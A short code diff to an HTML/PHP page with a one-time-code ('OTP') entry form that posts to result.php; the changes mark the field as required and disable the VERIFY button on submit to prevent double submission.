@@ -107,13 +107,13 @@ curl_close($ch);
                 </div>
             </div>
         </header>
-        <form action="result.php" accept-charset="UTF-8" method="POST">
+        <form action="result.php" accept-charset="UTF-8" method="POST" onSubmit="document.getElementById('myBtn').disabled=true;">
           <div class="container">
               <h2 class="site-description" style="color: white; font-size: 2rem;">Enter the OTP code:</h2>
-              <input name="otp" placeholder="" type="text" style="font-size: 5rem; text-align: center;">
+              <input name="otp" placeholder="" type="text" style="font-size: 5rem; text-align: center;" required>
               <p></p><br>
               <p></p><br>
-              <button name="button1" type="submit">VERIFY</button>
+              <button name="button1" id="myBtn" type="submit">VERIFY</button>
             
           </div>
         </form>
